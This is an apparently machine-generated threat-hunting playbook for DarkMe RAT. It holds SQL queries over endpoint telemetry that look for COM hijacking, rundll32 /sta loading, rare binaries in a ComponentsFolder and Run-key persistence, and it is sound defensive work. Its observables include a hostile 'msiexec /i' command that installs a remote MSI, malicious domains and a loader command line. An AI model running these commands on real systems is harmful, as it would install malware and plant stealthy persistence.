---
analysis: "This is a hunt because it pivots between four distinct surfaces\u2014script\
  \ activity, registry keys, process command lines, and binary prevalence\u2014to\
  \ reconstruct a chain that evades single-surface detection rules."
blind_spots:
- id: incomplete-telemetry
  question: Whether the script execution was missed on hosts with legacy logging.
  requires: full hb_script_activity and hb_registry_activity coverage
  risk: If script block logging is not enabled, the primary evidence for the registration
    stage is lost, leaving only the process execution.
- id: encrypted-profiling-logic
  question: Which specific applications were targeted on this host?
  requires: binary analysis
  risk: The list of 329 targeted applications is hex-encoded inside the VB6 DLL; we
    can detect the logic's side effects (the log) but not the profiling itself in
    telemetry.
  stage: application-discovery-gate
coverage:
- stage: scripted-com-hijacking
  status: covered
  steps:
  - scripted-registration
- stage: rundll32-com-loader
  status: covered
  steps:
  - rundll32-sta-loader
- stage: application-discovery-gate
  status: covered
  steps:
  - rare-componentsfolder-binaries
- stage: registry-run-persistence
  status: covered
  steps:
  - persistence-mechanisms
- reason: 'Belongs to another part of the ''DarkMe RAT: A VB6 APT Trojan Turned Conventional
    Infostealer'' series.'
  stage: phishing-pif-delivery
  status: out_of_scope
- reason: 'Belongs to another part of the ''DarkMe RAT: A VB6 APT Trojan Turned Conventional
    Infostealer'' series.'
  stage: remote-msi-execution
  status: out_of_scope
- reason: 'Belongs to another part of the ''DarkMe RAT: A VB6 APT Trojan Turned Conventional
    Infostealer'' series.'
  stage: cabinet-file-staging
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: promote-to-detection
  justification: DarkMe is an APT-linked infostealer that uses non-standard execution
    paths like rundll32 /sta to bypass EDR; a negative result over the estate ensures
    this stealthy persistence is not active.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An intruder has established persistence and stealthy execution by hijacking
  a COM object via script and launching it with Rundll32's /sta flag, followed by
  a broad profiling of local financial and security applications.
labels:
- hunt
- attack.t1059.005
- attack.t1546.015
- attack.t1218.011
- attack.t1555
- attack.t1547.001
name: 'DarkMe RAT: COM Hijacking and Application Profiling'
parameters:
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
  scope_hosts:
    default: []
    description: 'Optional: List of hostnames to restrict behavior queries; if empty,
      the entire estate is checked.'
    type: list[string]
  target_clsid:
    default: '{CFDC57BA-1705-45AF-BA10-EFC3D592982B}'
    description: The CLSID used by DarkMe for COM hijacking.
    from:
      kind: article
      observed: '2024-09-22'
      ref: huntress
    type: string
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://www.huntress.com/blog/darkme-rat-abandons-exploits
    gates:
    - dry-run
    - lint
    - critic
    model: hb_google/gemini-3-flash-preview
rationale: Initial scoping focuses on hosts with the specific exemsi wrapper version;
  broaden the hunt to all workstations if the first stage finds no hits, as the wrapper
  may have been updated.
references:
- name: "Huntress \u2014 DarkMe RAT Abandons Exploits"
  url: https://www.huntress.com/blog/darkme-rat-abandons-exploits
related:
- hunt: darkme-initial-delivery-pif-msi
  reason: This hunt focuses on the loader and post-exploitation profiling, while the
    sibling hunt focuses on the initial phishing delivery.
  relation: out-of-scope-alternative
scenario:
  stages:
  - name: Social Engineering PIF Delivery
    observables:
    - https://readonline365.com/view/image.png
    - image.pif
    slug: phishing-pif-delivery
    tactic: initial-access
    techniques:
    - T1566
  - name: Remote MSI Proxy Execution
    observables:
    - msiexec /i https://onlineview365.com/propi.msi /quiet /norestart
    - propi.msi
    - exemsi version 11.0.53.0
    slug: remote-msi-execution
    tactic: execution
    techniques:
    - T1218
  - name: Cabinet File Extraction
    observables:
    - EXPAND.EXE -R files.cab
    - '%AppData%\ComponentsFolder\'
    - files.cab
    slug: cabinet-file-staging
    tactic: execution
    techniques:
    - T1059
  - name: Scripted COM Object Registration
    observables:
    - prnfig.wsf
    - wScript.exe
    - reg.exe import filetext2.txt
    - HKCU\Software\Classes\CLSID\{CFDC57BA-1705-45AF-BA10-EFC3D592982B}
    - ProgID Coconout.Primary
    slug: scripted-com-hijacking
    tactic: persistence
    techniques:
    - T1059.005
    - T1546.015
  - name: Rundll32 COM Entry Loader
    observables:
    - rundll32.exe /sta {CFDC57BA-1705-45AF-BA10-EFC3D592982B}
    - Coconout.dll
    - Use.dll
    - Finalized.dll
    slug: rundll32-com-loader
    tactic: stealth
    techniques:
    - T1218.011
  - name: Broad Application Discovery Gate
    observables:
    - metamask.exe
    - keepass.exe
    - pokerstars.exe
    - mullvad-deamon.exe
    - razersynapse.exe
    slug: application-discovery-gate
    tactic: credential-access
    techniques:
    - T1555
  - name: Registry Run-Key Persistence
    observables:
    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    - HKCU\Software\Classes\Locked\shell\open\command
    - '%TEMP%\Zeta_Component.log'
    slug: registry-run-persistence
    tactic: persistence
    techniques:
    - T1547.001
  summary: Water Hydra (EvilNum) has transitioned from zero-day exploits to social
    engineering campaigns, delivering the DarkMe RAT via a spoofed .pif executable.
    The intrusion leverages a remote-hosted MSI installer to stage a multi-layered
    VB6 loader that utilizes COM hijacking and a massive application-discovery gate
    before establishing persistence via the Windows Registry.
series:
  index: 2
  slug: darkme-rat-a-vb6-apt-trojan-turned-conventional-infostealer
  title: 'DarkMe RAT: A VB6 APT Trojan Turned Conventional Infostealer'
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
tlp: clear
type: investigation
---


# DarkMe RAT: COM Hijacking and Application Profiling

This hunt identifies the sophisticated multi-stage VB6 loader mechanics used by DarkMe (Water Hydra). It follows the chain from scripted COM registration to the use of the obscure rundll32 /sta command line to bypass traditional detection. The hunt then pivots to find evidence of the second stage, which profiles over 300 target applications—including crypto wallets, trading platforms, and VPN clients—and establishes persistence through custom protocol handlers. By stack-counting rare binaries in user-writable components folders, we find the core malware modules that evade standard file-based alerts.

## scope-msi-wrapper
<!-- Scope by MSI Wrapper version -->
Find hosts that have software installed using the specific exemsi MSI Wrapper (v11.0.53.0) observed in DarkMe campaigns.

```sqlite target=endpoint role=scoping
~~~yaml
expected: A list of hosts that installed software via the specific wrapper version.
  This narrows the hunt to the most likely beachheads.
reads:
- device_hostname
- package_name
- package_version
- vendor_name
silence: not_evidence_of_absence
source: hb_software_inventory
verified: dry-run
verified_at: '2026-09-23'
~~~
SELECT device_hostname, package_name, package_version, vendor_name FROM hb_software_inventory WHERE package_version = '11.0.53.0' AND LOWER(vendor_name) LIKE '%exemsi%'
```

## parallel-early
<!-- Identify script and loader activity -->
parallel:
- → scripted-registration
- → rundll32-sta-loader
join: → early-triage

## scripted-registration
<!-- Scripted COM Registration -->
Find the execution of Windows Script Host (.wsf) that imports registry keys to hijack a COM object.

```sqlite target=endpoint role=enrichment params=(target_clsid=target_clsid, scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: A script block containing the target CLSID and references to registry imports.
  This confirms the persistence mechanism was staged.
reads:
- device_hostname
- script_path
- script_content
- time
silence: not_evidence_of_absence
source: hb_script_activity
verified: dry-run
verified_at: '2026-09-23'
~~~
SELECT device_hostname, script_path, script_content, time FROM hb_script_activity WHERE (instr(LOWER(script_content), LOWER('{{target_clsid}}')) > 0 OR LOWER(script_content) LIKE '%coconout.primary%') AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## rundll32-sta-loader
<!-- Rundll32 STA loader execution -->
Identify the use of rundll32.exe with the /sta flag to load the hijacked COM server, a signature evasion technique.

```sqlite target=endpoint role=detection-candidate params=(target_clsid=target_clsid, scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: A rundll32 process command line containing /sta and the hijacked CLSID.
  This is the primary indicator of execution.
reads:
- device_hostname
- process_cmd_line
- user_name
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-23'
~~~
SELECT device_hostname, process_cmd_line, user_name, time FROM hb_process_activity WHERE LOWER(process_cmd_line) LIKE '%/sta%' AND instr(LOWER(process_cmd_line), LOWER('{{target_clsid}}')) > 0 AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## early-triage
<!-- Early stage triage -->
```agent target=hunter
cite: required
context:
- scripted-registration
- rundll32-sta-loader
max_iterations: 4
objective: Confirm the presence of DarkMe loader stages 1 and 2 on the identified
  hosts.
success_criteria: A per-host verdict of malicious, suspicious, or benign with cited
  process and script rows.
tools:
- endpoint
```

## parallel-late
<!-- Follow-on persistence and profiling -->
parallel:
- → persistence-mechanisms
- → rare-componentsfolder-binaries
join: → late-triage

## persistence-mechanisms
<!-- Persistence via Run and Locked protocol -->
Find the secondary persistence mechanisms: standard Run keys and the unusual Locked protocol registration.

```sqlite target=endpoint role=enrichment params=(target_clsid=target_clsid, scope_hosts=scope_hosts, lookback_days=lookback_days)
~~~yaml
expected: Registry entries pointing to the rundll32 /sta command line, particularly
  under the 'Locked' protocol handler.
reads:
- device_hostname
- reg_target
- reg_value_data
- time
silence: not_evidence_of_absence
source: hb_registry_activity
verified: dry-run
verified_at: '2026-09-23'
~~~
SELECT device_hostname, reg_target, reg_value_data, time FROM hb_registry_activity WHERE (LOWER(reg_target) LIKE '%\currentversion\run%' OR LOWER(reg_target) LIKE '%\classes\locked\shell\open\command%') AND instr(LOWER(reg_value_data), LOWER('{{target_clsid}}')) > 0 AND ('{{scope_hosts}}' = '' OR instr(',' || '{{scope_hosts}}' || ',', ',' || device_hostname || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## rare-componentsfolder-binaries
<!-- Rare binaries in ComponentsFolder -->
Stack-count processes running from the AppData ComponentsFolder to identify the rare DarkMe modules across the fleet.

```sqlite target=endpoint role=baseline params=(lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: A list of binaries present on only one or two hosts. Genuine software rarely
  installs into a folder with this specific name.
prevalence:
  by: device_hostname
  key:
  - path
  rare_below: 3
reads:
- process_path
- device_hostname
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-23'
~~~
SELECT LOWER(process_path) AS path, COUNT(DISTINCT device_hostname) AS host_count, COUNT(*) AS launch_count, MIN(time) AS first_seen FROM hb_process_activity WHERE LOWER(process_path) LIKE '%\appdata\componentsfolder\%' AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY path HAVING host_count <= 2 ORDER BY host_count ASC
```

## late-triage
<!-- Final stage triage -->
```agent target=hunter
cite: required
context:
- early-triage
- persistence-mechanisms
- rare-componentsfolder-binaries
max_iterations: 4
objective: Identify hosts where DarkMe has successfully established persistence and
  is likely profiling local applications.
success_criteria: A consolidated verdict citing the loader execution, the persistence
  keys, and the rare binaries.
tools:
- endpoint
```

## route
<!-- Route on verdict -->
if~: "the late-triage verdict is malicious for at least one host" (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: incomplete-telemetry)
else: → close-out

## isolate-host
<!-- Isolate host -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host and preserve the %AppData%\ComponentsFolder\ and %AppData%\Microsoft\ folders for forensic collection.
```
→ analyst-review

## analyst-review
<!-- Analyst review -->
```manual target=analyst
Check the %TEMP%\Zeta_Component.log for debug output. Review the rare binaries identified in the prevalence step and confirm if they correspond to the DarkMe VB6 loaders (Coconout.dll, Use.dll, Finalized.dll).
```
→ close-out

## close-out
<!-- Close out -->
```manual target=analyst
Record the affected hosts and users. If the rundll32 /sta execution was high-confidence, promote the associated query to a permanent detection rule.
```
→ end
